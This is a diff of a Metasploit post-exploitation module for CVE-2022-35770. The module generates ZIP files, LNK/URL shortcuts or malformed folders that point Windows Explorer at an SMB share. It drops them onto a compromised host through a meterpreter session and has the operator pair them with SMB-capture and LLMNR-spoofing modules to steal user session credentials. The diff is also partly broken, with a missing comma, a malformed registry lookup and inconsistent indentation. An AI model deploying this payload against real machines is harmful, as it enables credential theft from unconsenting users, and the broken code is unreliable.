@@ -8,87 +8,69 @@ class MetasploitModule < Msf::Post
   include Msf::Exploit::FILEFORMAT
   include Msf::Post::Common
   include Msf::Post::File
-  include Msf::Exploit::FileDropper
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'  => 'Windows File Explorer Information Disclosure Vulnerabilities (zGhost)',
-      'Description' => %q{
+      'Name'           => 'Windows File Explorer Information Disclosure Vulnerabilies',
+      'Description'    => %q{
         This module exploits a vulnerability in the handling of Windows shortcuts, zipfiles and directories.
-        Loading arbitrary icons via non-existent SMB shares or otherwise corrupted directories, shortcuts and
+        Loading arbitrary icons via non-existant SMB shares or otherwise corruped directories, shortcuts and
         zip contents can lead to disclosure of user session credentials.
 
-        The module can generate a ZIP file with shortcuts or a directory with malformed configuration.
-        The ZIP (CVE Bypass) can be used to drop the payload on the target machine, while the directory can be used to create
-        a folder with malformed configuration that will trigger the vulnerability when accessed.
-        
-        The module can also check if the October 2022 update is installed, which mitigates this vulnerability.
-      },
-      'Author'  =>
-        [
-          'RGFulw'  #Vuln & Module
-        ],
-      'References'  =>
-        [
-          ['CVE', '2022-35770'],
-          ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2022-35770'],
-          ['URL', 'https://youtu.be/b0FMKmeacI0'], # Demo
-        ],
-      'DisclosureDate'  => 'Oct 11 2022',
-      'Version'         => '$Revision: 1.2 $',
-      'Notes'           => %q{
+        Either create a zip payload containing nessessary shortcut(s), or a directory containing malformed 
+        configuration, then drop the payload to a target directory.
+
         Run 'auxiliary/server/capture/smb' and 'auxiliary/spoof/llmnr/llmnr_response' modules to handle the requests broadcasted from
         these payloads.
       },
-      'Stability'       => [ CRASH_SAFE, REPEATABLE_SESSION ],
-      'Reliability'     => [ EXPLOITABLE_TOKEN ],
-      'SideEffects'     => [ IO_ON_DISK, ARTIFACTS_ON_DISK ],
-      'Compatibility'   => [ POST_MODULE, FILE_FORMAT ]
-      'License'         => MSF_LICENSE,
-      'Platform'        => [ 'win' ],
-      'Arch'            => [ARCH_ANY, ARCH_X86, ARCH_X64],
-      'Targets'         =>
+      'Author'         =>
         [
-          [ 'Windows', { 'Arch'     => ARCH_ANY } ],
-          [ 'Windows x64', { 'Arch' => ARCH_X64 } ],
-          [ 'Windows x86', { 'Arch' => ARCH_X86 } ]
+          'RGFulw',
         ],
+      'References'     =>
+        [
+          ['CVE', '2022-35770'],
+          ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2022-35770'],
+          ['URL', 'https://youtu.be/M056EeXlM6Y?si'], # Demo
+        ],
+      'DisclosureDate' => 'Oct 11 2022',
+      'License'        => MSF_LICENSE,
+      'Platform'       => [ 'win' ],
+      'Arch'           => [ARCH_ANY, ARCH_X86, ARCH_X64],
+      'Targets'        =>
+       [
+         [ 'Windows', { 'Arch' => ARCH_ANY } ],
+         [ 'Windows x64', { 'Arch' => ARCH_X64 } ],
+         [ 'Windows x86', { 'Arch' => ARCH_X86 } ]
+       ],
       'DefaultTarget'  => 1, # 64-bit
       'SessionTypes'   => [ 'meterpreter' ]
     ))
 
-    register_options([
-      OptString.new('FILENAME', [ true, 'Name of the generated ZIP', '7807.zip' ]),
-      OptString.new('FOLDER', [ false, 'Name of the generated folder', '' ]),
-      OptString.new('REMOTEDIR', [ true, 'Directory to drop payload on the target machine', '%USERPROFILE%/Desktop'])
-    ])
+  register_options([
+    OptString.new('FILENAME', [ true, 'Name of the generated ZIP', '7807.zip' ]),
+    OptString.new('FOLDER', [ false, 'Corrupted foldername', '']),
+    OptString.new('LNKNAME', [ false, 'Filename of LNK shortcut', '']),
+    OptString.new('URLNAME', [ false, 'Filename of URL shortcut', '']),
+    OptString.new('REMOTEDIR', [ true, 'Directory to drop payload on the target machine', '%APPDATA%/../../Desktop']),
+    OptString.new('SMBHOST', [ true, 'SMB share referenced by the payloads', 'AAAA/AAA'])
+  ])
+end
 
-    register_advanced_options([
-      OptString.new('LNKNAME', [ false, 'Filename of LNK shortcut', 'LinkMe' ]),
-      OptString.new('URLNAME', [ false, 'Filename of URL shortcut', 'DontURLme' ]),
-      OptString.new('SMBHOST', [ true, 'Targeted SMB share referenced by payload [default corrupt]', 'AAAA/AAA']),
-      OptBool.new('CHECK', [ false, 'Check update status before running', false ])
-    ])
+def run
+  print_status("Target OS: #{osInfo[:osName]}")
+  updateInstalled = updateInstall("KB5018410, KB5018411, KB5018418, KB5018419, KB5018421, KB5018425, KB5018427, KB5018446, KB5018450, KB5018454, KB5018457, KB5018474, KB5018476, KB5018478, KB5018479")
+
+  if updateInstalled
+    unless confirm("The October 2022 update is installed on this system. Do you want to continue? (y/n)")
+      return
+    end
+  else
+    print_good("The October 2022 update is not installed, system may be vulnerable")
   end
 
-  def run
-    if datastore['CHECK'] == true
-      print_status("Checking for October 2022 update...")
-      updateInstall
-      update_kbs = "KB5018410, KB5018411, KB5018418, KB5018419, KB5018421, KB5018425, KB5018427, KB5018446, KB5018450, KB5018454, KB5018457, KB5018474, KB5018476, KB5018478, KB5018479"
-      update_installed = updateInstall(update_kbs)
-
-      if update_installed
-        unless confirm("The October 2022 update is installed on this system. Do you wish to continue? (y/n)")
-          return
-        end
-      else
-        print_good("Update not installed, system may be vulnerable")
-      end
-    end
-
-    if (datastore['LNKNAME'] && !datastore['LNKNAME'].empty?) || (datastore['URLNAME'] && !datastore['URLNAME'].empty?)
-      generateShortcut
+  if datastore['LNKNAME'] && !datastore['LNKNAME'].empty? || datastore['URLNAME'] && !datastore['URLNAME'].empty?
+    generateShortcut
     elsif datastore['FOLDER'] && !datastore['FOLDER'].empty?
       generateDirectory
     else
@@ -97,17 +79,24 @@ class MetasploitModule < Msf::Post
     end  
   end
 
-  def updateInstall(kbIds)
-    kbIds.split(',').map(&:strip).any? do |kb|
-      begin
-        key = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Component Based Servicing\\Packages"
-        registry_enumkeys(key).any? { |k| k.include?(kb) }
-      rescue
-        false
-      end
-    end
+  def osInfo
+    osName = sysinfo['OS']
+    { osName: osName}
+  rescue
+    nil
+  end
+
+  def updateInstall(kbId)
+    updateKeyPath = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Component Based Servicing\\Packages\\#{kbId}"
+    registry_enumkeys(updateKeyPath).any?
   rescue
     false
+  end
+
+  def confirm(message)
+    print_status(message)
+    response = readline.strip.downcase
+    response == 'y'
   end
 
   def generateShortcut
@@ -227,11 +216,5 @@ class MetasploitModule < Msf::Post
     print_good("Payload extracted to #{directory}\\#{datastore['FOLDER']}")
     session.shell_command_token("del \"#{directory}\\#{datastore['FILENAME']}\"")
     system("rm -rf #{Dir.tmpdir}/#{sysfolder} ; rm #{Dir.tmpdir}/#{datastore['FILENAME']}")
-  end
-
-  def confirm(message)
-    print_status(message)
-    response = readline.strip.downcase
-    response == 'y'
   end
 end
